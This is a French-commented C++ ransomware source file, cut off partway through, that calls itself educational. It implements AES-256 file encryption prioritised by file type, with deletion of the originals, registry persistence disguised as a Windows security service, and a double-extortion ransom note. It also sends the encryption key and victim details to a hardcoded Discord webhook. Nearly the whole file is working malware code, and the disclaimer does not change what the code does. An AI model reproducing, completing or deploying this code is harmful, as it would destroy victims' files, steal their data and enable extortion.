/**
 * RANSOMWARE EN C++
 * =================
 * 
 * Ce fichier est un exemple de ransomware utilisant des techniques avancées de persistance et blocage.
 * ATTENTION: Ce code est fourni à des fins éducatives uniquement pour comprendre les menaces.
 * L'utilisation malveillante de ce code est illégale et strictement interdite.
 * 
 * Principales fonctionnalités:
 * ----------------------------
 * 1. Chiffrement AES-256 des fichiers avec priorité sur les documents critiques
 * 2. Persistance multi-méthode pour survivre aux redémarrages (registre, MBR, tâches planifiées)
 * 3. Exploitation multi-thread pour chiffrement rapide et parallèle
 * 4. Blocage agressif des contrôles système et interfaces utilisateur
 * 5. Désactivation des logiciels de sécurité et prévention de l'arrêt du système
 * 6. Exfiltration de données sensibles avant chiffrement
 * 7. Interface graphique en plein écran impossible à fermer
 * 
 * Techniques avancées implémentées:
 * --------------------------------
 * - Simulation d'infection du MBR pour charger au démarrage système
 * - Blocage des contrôles système via hooks de clavier et modifications de registre
 * - Élévation de privilèges via les services système
 * - Désactivation des réglages de sécurité et contournement des antivirus
 * - Suppression des méthodes de récupération (points de restauration, backups)
 * - Prévention active des tentatives d'arrêt système
 * 
 * AVERTISSEMENT: Utiliser ce code dans un environnement de test isolé uniquement.
 * Son déploiement sur des systèmes réels sans consentement est illégal.
 */

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <chrono>
#include <random>
#include <algorithm>
#include <cstring>
#include <thread>
#include <future>
#include <atomic>
#include <mutex>
#include <iomanip>
#include <sstream>
#include <unordered_map>
#include <functional>

// Cryptographie
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

// Windows API
#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <winreg.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#endif

// UUID generation
#ifdef _WIN32
#include <rpc.h>
#pragma comment(lib, "rpcrt4.lib")
#else
#include <uuid/uuid.h>
#endif

namespace fs = std::filesystem;

// Structure pour partager des données entre les threads
#ifdef _WIN32
struct SharedData {
    int totalFiles;
    std::atomic<int> processedFiles;
    std::string currentFileName;           // Nom du fichier actuellement en cours de chiffrement
    std::vector<std::string> lastEncrypted; // Liste des derniers fichiers chiffrés
    std::mutex dataMutex;                  // Mutex pour protéger l'accès aux données partagées
    HWND hwnd;
    HWND hEditKey;                         // Handle du champ de saisie pour la clé
    HWND hDecryptButton;                   // Handle du bouton de déchiffrement
    bool decryptMode;                      // Mode de déchiffrement activé
    char decryptKey[256];                  // Clé de déchiffrement saisie
};
#endif

// Déclaration anticipée des fonctions Windows
#ifdef _WIN32
// Fonctions pour la fenêtre bloquante
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
DWORD WINAPI UpdateProgressThread(LPVOID lpParam);
HWND CreateFullscreenBlockingWindow(SharedData* data);

// Fonctions de contrôle système
bool disableTaskManager();
bool disableRegistry();
bool disableCmd();
bool preventShutdown();
bool disableSystemControls();
void killEssentialProcesses();
void setHighestPriority();
#endif

// Structure pour suivre l'état du chiffrement
struct EncryptionState {
    bool started;
    bool completed;
    std::vector<std::string> encryptedPaths;
};

// Configuration de la console Windows
#ifdef _WIN32
void setupConsole() {
    // Définir l'encodage en UTF-8
    SetConsoleOutputCP(CP_UTF8);
    // Activer le support des caractères spéciaux
    SetConsoleCP(CP_UTF8);
}
#endif

// Discord Webhook URL
const std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1354564587751735437/Sf4ab7f_d5Q-HTyIwvfMcs-QPs2YGUVQwhEZUVZmaWtslZhI78YPCj1wmYzI7NU1eVnN";

// Bannière
const std::string BANNER = R"(
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗██╗    ██╗ █████╗ ██████╗ ███████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██║    ██║██╔══██╗██╔══██╗██╔════╝
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║██║ █╗ ██║███████║██████╔╝█████╗  
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║╚███╔███╔╝██║  ██║██║  ██║███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                                          
                Vos fichiers ont été chiffrés! Payez la rançon pour récupérer vos données.
)";

// Extension pour les fichiers chiffrés
const std::string ENCRYPTED_EXTENSION = ".encrypted";

// Structure pour définir les priorités des types de fichiers
struct FileTypePriority {
    std::string extension;
    int priority;  // Plus le nombre est petit, plus la priorité est haute
    std::string description;
};

// Types de fichiers à chiffrer avec leurs priorités
const std::vector<FileTypePriority> FILE_PRIORITIES = {
    // Priorité 1 - Fichiers critiques
    {".sql", 1, "Base de données"},
    {".db", 1, "Base de données"},
    {".sqlite", 1, "Base de données"},
    {".key", 1, "Clés de sécurité"},
    {".pem", 1, "Certificats"},
    {".env", 1, "Variables d'environnement"},
    {".config", 1, "Fichiers de configuration"},
    
    // Priorité 2 - Documents importants
    {".doc", 2, "Documents Word"},
    {".docx", 2, "Documents Word"},
    {".xls", 2, "Tableurs Excel"},
    {".xlsx", 2, "Tableurs Excel"},
    {".pdf", 2, "Documents PDF"},
    {".ppt", 2, "Présentations PowerPoint"},
    {".pptx", 2, "Présentations PowerPoint"},
    
    // Priorité 3 - Autres documents
    {".txt", 3, "Fichiers texte"},
    {".rtf", 3, "Documents RTF"},
    {".odt", 3, "Documents OpenDocument"},
    {".csv", 3, "Données tabulaires"},
    {".json", 3, "Données JSON"},
    {".xml", 3, "Données XML"},
    
    // Priorité 4 - Images et médias
    {".jpg", 4, "Images JPEG"},
    {".jpeg", 4, "Images JPEG"},
    {".png", 4, "Images PNG"},
    {".gif", 4, "Images GIF"},
    {".bmp", 4, "Images BMP"},
    {".tiff", 4, "Images TIFF"},
    {".svg", 4, "Images vectorielles"},
    {".webp", 4, "Images WebP"},
    {".mp3", 4, "Audio MP3"},
    {".mp4", 4, "Vidéo MP4"},
    {".wav", 4, "Audio WAV"},
    {".avi", 4, "Vidéo AVI"},
    {".mov", 4, "Vidéo MOV"},
    {".flv", 4, "Vidéo FLV"},
    {".mkv", 4, "Vidéo MKV"},
    
    // Priorité 5 - Archives et autres
    {".zip", 5, "Archives ZIP"},
    {".rar", 5, "Archives RAR"},
    {".7z", 5, "Archives 7-Zip"},
    {".tar", 5, "Archives TAR"},
    {".gz", 5, "Archives GZ"},
    {".bak", 5, "Sauvegardes"},
    {".backup", 5, "Sauvegardes"},
    {".old", 5, "Anciens fichiers"},
    {".log", 5, "Fichiers de logs"}
};

// Dossiers à éviter
const std::vector<std::string> EXCLUDE_DIRS = {
    "Windows", "Program Files", "Program Files (x86)", "AppData", 
    "ProgramData", "$Recycle.Bin", "Microsoft", "Boot", "System Volume Information", 
    "bootmgr", "Recovery", "PerfLogs"
};

// Fonctions utilitaires
std::string GenerateUUID() {
#ifdef _WIN32
    UUID uuid;
    UuidCreate(&uuid);
    
    unsigned char* str;
    UuidToStringA(&uuid, &str);
    
    std::string uuid_str(reinterpret_cast<char*>(str));
    RpcStringFreeA(&str);
    
    return uuid_str;
#else
    uuid_t uuid;
    char uuid_str[37];
    
    uuid_generate_random(uuid);
    uuid_unparse_lower(uuid, uuid_str);
    
    return std::string(uuid_str);
#endif
}

// Base64 encode
std::string Base64Encode(const std::vector<unsigned char>& data) {
    BIO* b64 = BIO_new(BIO_f_base64());
    BIO* bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_write(b64, data.data(), static_cast<int>(data.size()));
    BIO_flush(b64);
    
    BUF_MEM* bptr;
    BIO_get_mem_ptr(b64, &bptr);
    
    std::string result(bptr->data, bptr->length - 1); // Remove trailing newline
    BIO_free_all(b64);
    
    return result;
}

// Ajout de la persistance au démarrage
bool AddToStartup(const std::string& exePath, const std::string& regName) {
#ifdef _WIN32
    HKEY hKey;
    LONG lResult = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    
    if (lResult != ERROR_SUCCESS) {
        return false;
    }
    
    lResult = RegSetValueExA(hKey, regName.c_str(), 0, REG_SZ, (BYTE*)exePath.c_str(), 
                          static_cast<DWORD>(exePath.length() + 1));
    RegCloseKey(hKey);
    
    return lResult == ERROR_SUCCESS;
#else
    // Non supporté sur les plateformes non-Windows
    return false;
#endif
}

// Supprimer la persistance au démarrage
bool RemoveFromStartup(const std::string& regName) {
#ifdef _WIN32
    HKEY hKey;
    LONG lResult = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    
    if (lResult != ERROR_SUCCESS) {
        return false;
    }
    
    lResult = RegDeleteValueA(hKey, regName.c_str());
    RegCloseKey(hKey);
    
    return lResult == ERROR_SUCCESS;
#else
    // Non supporté sur les plateformes non-Windows
    return false;
#endif
}

// Obtenir le chemin de l'exécutable
std::string GetExecutablePath() {
#ifdef _WIN32
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
#else
    // Linux & macOS
    char buffer[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", buffer, sizeof(buffer) - 1);
    if (len != -1) {
        buffer[len] = '\0';
        return std::string(buffer);
    }
    return "";
#endif
}

// Fonction pour envoyer des données via HTTP POST
bool SendHttpPost(const std::string& url, const std::string& data) {
#ifdef _WIN32
    // Initialiser WinINet
    HINTERNET hInternet = InternetOpenA("RansomwareClient/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }
    
    // Analyser l'URL
    URL_COMPONENTS urlComp;
    char hostName[256];
    char urlPath[1024];
    
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath);
    
    if (!InternetCrackUrlA(url.c_str(), url.length(), 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Se connecter au serveur
    HINTERNET hConnect = InternetConnectA(hInternet, hostName, urlComp.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Créer la requête
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Headers
    const char* headers = "Content-Type: application/json\r\n";
    
    // Envoyer la requête
    size_t dataLength = data.length();
    DWORD dwordLength = (dataLength > MAXDWORD) ? MAXDWORD : static_cast<DWORD>(dataLength);
    BOOL result = HttpSendRequestA(hRequest, headers, -1, (LPVOID)data.c_str(), dwordLength);
    
    // Nettoyer
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return result != FALSE;
#else
    // Sur les plateformes non-Windows, on peut utiliser libcurl ou une simple implémentation socket
    // Mais pour cet exemple, on retourne juste false
    return false;
#endif
}

// Classe pour le chiffrement/déchiffrement
class Encryption {
private:
    std::vector<unsigned char> key;
    std::vector<unsigned char> iv;
    
public:
    // Constructeur - Génère une nouvelle clé et IV
    Encryption() {
        key.resize(32); // AES-256
        iv.resize(16);  // Bloc AES
        
        // Générer une clé aléatoire
        RAND_bytes(key.data(), key.size());
        RAND_bytes(iv.data(), iv.size());
    }
    
    // Constructeur - Charger une clé existante
    Encryption(const std::string& keyPath) {
        key.resize(32);
        iv.resize(16);
        
        // Charger la clé depuis un fichier
        std::ifstream keyFile(keyPath, std::ios::binary);
        if (!keyFile) {
            throw std::runtime_error("Impossible d'ouvrir le fichier de clé");
        }
        
        keyFile.read(reinterpret_cast<char*>(key.data()), key.size());
        keyFile.read(reinterpret_cast<char*>(iv.data()), iv.size());
    }
    
    // Obtenir la clé
    const std::vector<unsigned char>& getKey() const {
        return key;
    }
    
    // Obtenir l'IV
    const std::vector<unsigned char>& getIV() const {
        return iv;
    }
    
    // Sauvegarder la clé
    void saveKey(const std::string& keyPath) {
        std::ofstream keyFile(keyPath, std::ios::binary);
        if (!keyFile) {
            throw std::runtime_error("Impossible de créer le fichier de clé");
        }
        
        keyFile.write(reinterpret_cast<const char*>(key.data()), key.size());
        keyFile.write(reinterpret_cast<const char*>(iv.data()), iv.size());
    }
    
    // Chiffrer un fichier
    bool encryptFile(const std::string& filePath) {
        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile) return false;
        
        std::string outFilePath = filePath + ENCRYPTED_EXTENSION;
        std::ofstream outFile(outFilePath, std::ios::binary);
        if (!outFile) return false;
        
        // Initialiser le contexte de chiffrement
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return false;
        
        // Initialiser l'opération de chiffrement
        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), iv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        // Écrire l'IV au début du fichier chiffré
        outFile.write(reinterpret_cast<const char*>(iv.data()), iv.size());
        
        // Chiffrer le fichier avec un buffer plus grand pour optimiser les I/O
        const int bufSize = 1024 * 1024; // 1 MB buffer
        std::vector<unsigned char> inBuf(bufSize);
        std::vector<unsigned char> outBuf(bufSize + EVP_MAX_BLOCK_LENGTH);
        int outLen;
        
        // Optimiser les I/O en désactivant les buffers synchronisés
        inFile.rdbuf()->pubsetbuf(0, 0);
        outFile.rdbuf()->pubsetbuf(0, 0);
        
        while (inFile) {
            inFile.read(reinterpret_cast<char*>(inBuf.data()), bufSize);
            size_t bytesReadSize = inFile.gcount();
            if (bytesReadSize <= 0) break;
            
            int bytesRead = (bytesReadSize > INT_MAX) ? INT_MAX : static_cast<int>(bytesReadSize);
            if (EVP_EncryptUpdate(ctx, outBuf.data(), &outLen, inBuf.data(), bytesRead) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                return false;
            }
            
            outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        }
        
        // Finaliser le chiffrement
        if (EVP_EncryptFinal_ex(ctx, outBuf.data(), &outLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        
        // Forcer l'écriture sur le disque
        outFile.flush();
        
        // Nettoyer
        EVP_CIPHER_CTX_free(ctx);
        
        return true;
    }
    
    // Déchiffrer un fichier
    bool decryptFile(const std::string& encryptedFilePath) {
        if (!fs::exists(encryptedFilePath)) return false;
        
        // Vérifier l'extension
        if (encryptedFilePath.find(ENCRYPTED_EXTENSION) == std::string::npos) return false;
        
        // Ouvrir le fichier chiffré
        std::ifstream inFile(encryptedFilePath, std::ios::binary);
        if (!inFile) return false;
        
        // Lire l'IV depuis le début du fichier
        std::vector<unsigned char> fileIv(16);
        inFile.read(reinterpret_cast<char*>(fileIv.data()), fileIv.size());
        
        // Créer le chemin du fichier déchiffré
        std::string outFilePath = encryptedFilePath.substr(0, encryptedFilePath.length() - ENCRYPTED_EXTENSION.length());
        std::ofstream outFile(outFilePath, std::ios::binary);
        if (!outFile) return false;
        
        // Initialiser le contexte de déchiffrement
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return false;
        
        // Initialiser l'opération de déchiffrement
        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), fileIv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        // Déchiffrer le fichier
        const int bufSize = 4096;
        std::vector<unsigned char> inBuf(bufSize);
        std::vector<unsigned char> outBuf(bufSize + EVP_MAX_BLOCK_LENGTH);
        int outLen;
        
        while (inFile) {
            inFile.read(reinterpret_cast<char*>(inBuf.data()), bufSize);
            size_t bytesReadSize = inFile.gcount();
            if (bytesReadSize <= 0) break;
            
            int bytesRead = (bytesReadSize > INT_MAX) ? INT_MAX : static_cast<int>(bytesReadSize);
            if (EVP_DecryptUpdate(ctx, outBuf.data(), &outLen, inBuf.data(), bytesRead) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                return false;
            }
            
            outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        }
        
        // Finaliser le déchiffrement
        if (EVP_DecryptFinal_ex(ctx, outBuf.data(), &outLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        
        // Nettoyer
        EVP_CIPHER_CTX_free(ctx);
        
        return true;
    }
};

// Fonction pour sauvegarder l'état du chiffrement
void saveEncryptionState(const EncryptionState& state) {
#ifdef _WIN32
    try {
        // Sauvegarder l'état dans le registre
        HKEY hKey;
        if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\State", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            // Sauvegarder si le chiffrement a commencé
            DWORD started = state.started ? 1 : 0;
            RegSetValueExA(hKey, "Started", 0, REG_DWORD, (BYTE*)&started, sizeof(started));
            
            // Sauvegarder si le chiffrement est terminé
            DWORD completed = state.completed ? 1 : 0;
            RegSetValueExA(hKey, "Completed", 0, REG_DWORD, (BYTE*)&completed, sizeof(completed));
            
            // Sauvegarder les chemins déjà chiffrés
            std::string paths;
            for (const auto& path : state.encryptedPaths) {
                paths += path + ";";
            }
            
            size_t pathsLength = paths.length() + 1; // +1 pour le caractère nul
            DWORD dwPathsLength = (pathsLength > MAXDWORD) ? MAXDWORD : static_cast<DWORD>(pathsLength);
            RegSetValueExA(hKey, "EncryptedPaths", 0, REG_SZ, (BYTE*)paths.c_str(), dwPathsLength);
            
            RegCloseKey(hKey);
        }
    }
    catch (...) {
        // Ignorer les erreurs
    }
#endif
}

// Fonction pour charger l'état du chiffrement
EncryptionState loadEncryptionState() {
    EncryptionState state;
    state.started = false;
    state.completed = false;
    
#ifdef _WIN32
    try {
        // Charger l'état depuis le registre
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\State", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            // Charger si le chiffrement a commencé
            DWORD started = 0;
            DWORD size = sizeof(started);
            if (RegQueryValueExA(hKey, "Started", NULL, NULL, (BYTE*)&started, &size) == ERROR_SUCCESS) {
                state.started = (started == 1);
            }
            
            // Charger si le chiffrement est terminé
            DWORD completed = 0;
            size = sizeof(completed);
            if (RegQueryValueExA(hKey, "Completed", NULL, NULL, (BYTE*)&completed, &size) == ERROR_SUCCESS) {
                state.completed = (completed == 1);
            }
            
            // Charger les chemins déjà chiffrés
            char paths[4096] = {0};
            size = sizeof(paths);
            if (RegQueryValueExA(hKey, "EncryptedPaths", NULL, NULL, (BYTE*)paths, &size) == ERROR_SUCCESS) {
                std::string pathsStr(paths);
                std::string delimiter = ";";
                
                size_t pos = 0;
                std::string token;
                while ((pos = pathsStr.find(delimiter)) != std::string::npos) {
                    token = pathsStr.substr(0, pos);
                    state.encryptedPaths.push_back(token);
                    pathsStr.erase(0, pos + delimiter.length());
                }
            }
            
            RegCloseKey(hKey);
        }
    }
    catch (...) {
        // Ignorer les erreurs
    }
#endif
    
    return state;
}

// Vérifier si le ransomware est déjà en cours d'exécution
bool isRansomwareRunning() {
    // Création d'un mutex global
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\RansomwareLock");
    
    // Si le mutex existe déjà, le ransomware est en cours d'exécution
    if (hMutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return true;
    }
    
    // Si non, on garde le handle ouvert pour le verrouillage
    return false;
}

// Classe principale du ransomware
class Ransomware {
private:
    Encryption encryption;
    std::string victimId;
    std::string desktopPath;
    std::string documentsPath;
    std::string ransomNotePath;
    std::atomic<int> encryptedFilesCount;
    std::atomic<int> failedFilesCount;
    std::mutex outputMutex;
    SharedData* sharedData;  // Référence aux données partagées
    
    // Vérifie si un chemin est sûr
    bool isSafePath(const std::string& path) {
        std::string lowerPath = path;
        std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::tolower);
        
        for (const auto& excludeDir : EXCLUDE_DIRS) {
            std::string lowerExclude = excludeDir;
            std::transform(lowerExclude.begin(), lowerExclude.end(), lowerExclude.begin(), ::tolower);
            
            if (lowerPath.find(lowerExclude) != std::string::npos) {
                return false;
            }
        }
        
        return true;
    }
    
    // Traite un fichier
    bool processFile(const std::string& filePath) {
        try {
            // Vérifier si le fichier est déjà chiffré
            if (filePath.find(ENCRYPTED_EXTENSION) != std::string::npos) {
                return false;
            }
            
            // Vérifier l'extension du fichier
            fs::path path(filePath);
            std::string extension = path.extension().string();
            std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
            
            // Trouver la priorité du type de fichier
            int filePriority = INT_MAX;
            for (const auto& fileType : FILE_PRIORITIES) {
                if (extension == fileType.extension) {
                    filePriority = fileType.priority;
                    break;
                }
            }
            
            // Si l'extension n'est pas dans notre liste, ignorer le fichier
            if (filePriority == INT_MAX) {
                return false;
            }
            
            // Mettre à jour l'interface pour afficher le fichier en cours de chiffrement
            if (sharedData) {
                std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                sharedData->currentFileName = path.filename().string();
                // Forcer la mise à jour de la fenêtre
                InvalidateRect(sharedData->hwnd, NULL, TRUE);
            }
            
            // Chiffrer le fichier
            bool success = encryption.encryptFile(filePath);
            
            if (success) {
                // Supprimer le fichier original
                fs::remove(filePath);
                encryptedFilesCount++;
                
                // Mettre à jour les informations sur l'interface
                if (sharedData) {
                    std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                    sharedData->processedFiles++;
                    sharedData->lastEncrypted.insert(sharedData->lastEncrypted.begin(), path.filename().string());
                    
                    // Limiter la liste à 10 fichiers
                    if (sharedData->lastEncrypted.size() > 10) {
                        sharedData->lastEncrypted.resize(10);
                    }
                    
                    // Réinitialiser le fichier en cours
                    sharedData->currentFileName = "";
                    
                    // Forcer la mise à jour de la fenêtre
                    InvalidateRect(sharedData->hwnd, NULL, TRUE);
                }
                
                {
                    std::lock_guard<std::mutex> lock(outputMutex);
                    std::cout << "[+] Chiffré (Priorité " << filePriority << "): " << filePath << std::endl;
                }
                
                return true;
            }
            else {
                failedFilesCount++;
                
                // Réinitialiser le fichier en cours en cas d'échec
                if (sharedData) {
                    std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                    sharedData->currentFileName = "";
                }
                
                return false;
            }
        }
        catch (...) {
            failedFilesCount++;
            
            // Réinitialiser le fichier en cours en cas d'erreur
            if (sharedData) {
                std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                sharedData->currentFileName = "";
            }
            
            return false;
        }
    }
    
    // Parcourir récursivement un répertoire
    void scanAndEncrypt(const std::string& directoryPath) {
        try {
            // Collecter tous les fichiers à chiffrer
            std::vector<std::string> filesToProcess;
            std::vector<std::string> highPriorityFiles;
            std::vector<std::string> mediumPriorityFiles;
            std::vector<std::string> lowPriorityFiles;
            
            // Limiter la taille de chaque lot pour éviter un épuisement de la mémoire
            const int MAX_BATCH_SIZE = 100000;
            
            try {
                for (const auto& entry : fs::recursive_directory_iterator(
                    directoryPath, 
                    fs::directory_options::skip_permission_denied)) {
                    
                    if (fs::is_regular_file(entry.status())) {
                        std::string filePath = entry.path().string();
                        
                        // Vérifier si le chemin est sûr
                        if (!isSafePath(filePath)) continue;
                        
                        // Vérifier l'extension du fichier
                        fs::path path(filePath);
                        std::string extension = path.extension().string();
                        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
                        
                        // Trouver la priorité du type de fichier
                        int filePriority = INT_MAX;
                        for (const auto& fileType : FILE_PRIORITIES) {
                            if (extension == fileType.extension) {
                                filePriority = fileType.priority;
                                break;
                            }
                        }
                        
                        // Classer le fichier selon sa priorité
                        if (filePriority <= 2) {
                            highPriorityFiles.push_back(filePath);
                        } else if (filePriority <= 5) {
                            mediumPriorityFiles.push_back(filePath);
                        } else if (filePriority < INT_MAX) {
                            lowPriorityFiles.push_back(filePath);
                        }
                        
                        // Limiter le nombre de fichiers pour éviter de manquer de mémoire
                        if (highPriorityFiles.size() + mediumPriorityFiles.size() + lowPriorityFiles.size() >= MAX_BATCH_SIZE) {
                            break;
                        }
                    }
                }
            } catch (...) {
                // Continuer avec les fichiers déjà collectés en cas d'erreur
            }
            
            // Traiter d'abord les fichiers de haute priorité
            if (!highPriorityFiles.empty()) {
                processBatch(highPriorityFiles);
            }
            
            // Puis les fichiers de priorité moyenne
            if (!mediumPriorityFiles.empty()) {
                processBatch(mediumPriorityFiles);
            }
            
            // Enfin les fichiers de basse priorité
            if (!lowPriorityFiles.empty()) {
                processBatch(lowPriorityFiles);
            }
        }
        catch (...) {
            // Ignorer les erreurs
        }
    }
    
    // Améliorer le traitement par lots avec plus de threads
    void processBatch(const std::vector<std::string>& batch) {
        // Utiliser le maximum de threads disponibles pour le processeur, mais au moins 4
        const unsigned int numThreads = (std::thread::hardware_concurrency() * 2 > 4) ? 
            std::thread::hardware_concurrency() * 2 : 4;
        std::vector<std::thread> threads;
        
        for (unsigned int i = 0; i < numThreads; i++) {
            threads.push_back(std::thread([this, &batch, i, numThreads]() {
                for (size_t j = i; j < batch.size(); j += numThreads) {
                    processFile(batch[j]);
                }
            }));
            
            // Définir la priorité du thread à ABOVE_NORMAL pour accélérer le chiffrement
            if (threads.back().native_handle()) {
                SetThreadPriority(threads.back().native_handle(), THREAD_PRIORITY_ABOVE_NORMAL);
            }
        }
        
        // Attendre que tous les threads terminent
        for (auto& thread : threads) {
            thread.join();
        }
    }
    
    // Créer la note de rançon
    void createRansomNote() {
        std::ofstream noteFile(ransomNotePath);
        if (!noteFile) return;
        
        noteFile << BANNER << std::endl << std::endl;
        noteFile << "!!! ATTENTION !!!" << std::endl << std::endl;
        noteFile << "Tous vos fichiers importants ont été chiffrés avec un algorithme militaire AES-256." << std::endl;
        noteFile << "Vos photos, documents, vidéos, et autres données personnelles sont maintenant inaccessibles." << std::endl << std::endl;
        noteFile << "⚠️ DOUBLE EXTORSION ⚠️" << std::endl;
        noteFile << "Nous avons également volé vos fichiers sensibles avant le chiffrement." << std::endl;
        noteFile << "Si vous ne payez pas la rançon, nous publierons ces fichiers sur Internet." << std::endl << std::endl;
        noteFile << "Pour récupérer vos fichiers, vous devez payer une rançon." << std::endl << std::endl;
        noteFile << "Instructions:" << std::endl;
        noteFile << "1. Envoyez 500$ en Bitcoin à l'adresse: 1A2B3C4D5E6F7G8H9I0J" << std::endl;
        noteFile << "2. Envoyez la preuve de paiement et votre ID unique à: evil@hacker.com" << std::endl;
        noteFile << "3. Vous recevrez un outil de déchiffrement et la clé unique pour restaurer vos fichiers" << std::endl;
        noteFile << "4. Nous supprimerons les copies de vos fichiers volés" << std::endl << std::endl;
        noteFile << "ATTENTION:" << std::endl;
        noteFile << "- N'essayez pas de déchiffrer vos fichiers vous-même, vous risquez de les perdre définitivement" << std::endl;
        noteFile << "- Ne reformatez pas votre système, vous perdriez toutes vos données" << std::endl;
        noteFile << "- Vous avez 72 heures pour payer, après quoi le prix doublera" << std::endl;
        noteFile << "- Après 7 jours, vos fichiers seront publiés et la clé de déchiffrement détruite" << std::endl << std::endl;
        noteFile << "Votre ID unique est: " << victimId << std::endl;
        noteFile << "Nombre de fichiers chiffrés: " << encryptedFilesCount << std::endl;
        
        // Obtenir la date et l'heure actuelles
        auto now = std::chrono::system_clock::now();
        std::time_t time = std::chrono::system_clock::to_time_t(now);
        noteFile << "Date et heure du chiffrement: " << std::ctime(&time) << std::endl;
    }
    
    // Changer le fond d'écran (Windows uniquement)
    void changeDesktopBackground() {
#ifdef _WIN32
        // Cette fonction nécessiterait d'implémenter la création d'image
        // Ce qui dépasse le cadre de cet exemple
        // Vous pourriez utiliser une bibliothèque comme GDI+ ou simplement
        // copier une image existante
#endif
    }
    
    // Configuration de la persistance
    bool setupPersistence() {
        std::string exePath = GetExecutablePath();
        if (exePath.empty()) return false;
        
        return AddToStartup(exePath, "WindowsSecurityService");
    }

    // Envoyer la clé via webhook
    bool sendKeyToWebhook() {
        try {
            // Convertir la clé en base64
            std::string keyBase64 = Base64Encode(encryption.getKey());
            
            // Collecter les informations système complètes
            char hostname[256] = {0};
            gethostname(hostname, sizeof(hostname));
            
            char username[256] = {0};
            DWORD usernameLen = sizeof(username);
            GetUserNameA(username, &usernameLen);
            
            // Informations système détaillées
            std::string tempDir = std::getenv("TEMP");
            std::string infoDir = tempDir + "\\VictimData";
            fs::create_directories(infoDir);
            
            // Fichier avec liste complète des fichiers chiffrés
            std::string encryptedFilesListPath = infoDir + "\\encrypted_files.txt";
            std::ofstream encryptedFilesList(encryptedFilesListPath);
            if (encryptedFilesList) {
                encryptedFilesList << "=== FICHIERS CHIFFRÉS - VICTIME : " << victimId << " ===" << std::endl;
                encryptedFilesList << "Utilisateur: " << username << std::endl;
                encryptedFilesList << "Ordinateur: " << hostname << std::endl;
